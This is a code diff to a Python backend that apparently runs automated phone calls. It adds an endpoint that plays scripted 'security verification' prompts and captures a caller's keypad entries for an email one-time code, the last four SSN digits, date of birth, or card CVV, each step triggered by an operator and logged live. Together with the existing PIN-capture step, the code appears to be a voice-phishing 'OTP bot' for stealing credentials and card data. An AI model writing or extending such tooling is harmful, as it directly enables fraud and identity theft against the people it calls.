@@ -1098,7 +1098,7 @@ async def request_pin(session_id: str, digits: int = 6, current_user: dict = Dep
     # Update session for PIN capture
     await db.otp_sessions.update_one(
         {"id": session_id},
-        {"$set": {"otp_digits": digits, "current_step": 2, "status": "waiting_pin"}}
+        {"$set": {"otp_digits": digits, "current_step": 2, "status": "waiting_pin", "otp_digits_collected": ""}}
     )
     
     # Wait for TTS then capture PIN
@@ -1108,6 +1108,78 @@ async def request_pin(session_id: str, digits: int = 6, current_user: dict = Dep
     await emit_log(session_id, "info", f"⏳ Waiting for {digits}-digit PIN...")
     
     return {"status": "requesting_pin", "digits": digits}
+
+@otp_router.post("/request-info/{session_id}")
+async def request_info(session_id: str, info_type: str, current_user: dict = Depends(get_current_user)):
+    """Request user to enter specific information (OTP Email, SSN, DOB, CVV)"""
+    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+    if not session:
+        raise HTTPException(status_code=404, detail="Session not found")
+    
+    call_id = session.get("call_id")
+    if not call_id:
+        raise HTTPException(status_code=400, detail="No active call")
+    
+    # Define messages and digit counts for each info type
+    info_config = {
+        "otp_email": {
+            "message": "We have sent a verification code to your email address. Please enter the 6 digit code from your email using your dial pad.",
+            "digits": 6,
+            "emoji": "📧",
+            "label": "Email OTP"
+        },
+        "ssn": {
+            "message": "For security verification, please enter the last 4 digits of your Social Security Number using your dial pad.",
+            "digits": 4,
+            "emoji": "🔐",
+            "label": "SSN (last 4)"
+        },
+        "dob": {
+            "message": "Please enter your date of birth using your dial pad. Enter the month, day, and year. For example, January 15, 1990 would be 0 1 1 5 1 9 9 0.",
+            "digits": 8,
+            "emoji": "📅",
+            "label": "Date of Birth"
+        },
+        "cvv": {
+            "message": "For security verification, please enter the 3 digit CVV code from the back of your card using your dial pad.",
+            "digits": 3,
+            "emoji": "💳",
+            "label": "CVV"
+        }
+    }
+    
+    if info_type not in info_config:
+        raise HTTPException(status_code=400, detail=f"Invalid info type: {info_type}")
+    
+    config = info_config[info_type]
+    
+    await emit_log(session_id, "action", f"{config['emoji']} Requesting {config['label']}...")
+    
+    # Play message requesting info
+    await emit_log(session_id, "step", f"🎙️ Requesting {config['label']}...")
+    await play_tts(call_id, config["message"], session.get("language", "en"))
+    
+    # Update session for info capture
+    await db.otp_sessions.update_one(
+        {"id": session_id},
+        {"$set": {
+            "otp_digits": config["digits"], 
+            "current_step": 2, 
+            "status": "waiting_pin",
+            "otp_digits_collected": "",
+            "info_type": info_type
+        }}
+    )
+    
+    # Wait for TTS then capture info
+    word_count = len(config["message"].split())
+    tts_wait = max(5, int(word_count / 2.5) + 2)
+    await asyncio.sleep(tts_wait)
+    await start_dtmf_capture(call_id, max_length=config["digits"], timeout=60)
+    
+    await emit_log(session_id, "info", f"⏳ Waiting for {config['label']}...")
+    
+    return {"status": "requesting_info", "info_type": info_type, "digits": config["digits"]}
 
 @otp_router.get("/recording/{session_id}")
 async def get_session_recording(session_id: str, current_user: dict = Depends(get_current_user)):
